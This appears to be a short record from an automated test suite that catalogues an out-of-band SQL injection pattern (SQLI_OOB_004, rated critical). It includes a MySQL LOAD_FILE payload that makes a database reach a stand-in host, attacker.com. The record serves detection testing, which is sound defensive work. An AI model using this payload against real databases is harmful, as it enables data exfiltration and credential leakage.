name: test_e2e_with_logs[089_SQLI_OOB_004]
description:
## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_OOB_004` |
| **Name** | Out-of-band via LOAD_FILE |
| **Category** | SQLI |
| **Subcategory** | out_of_band |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `LOAD_FILE('\\attacker.com\\a')`
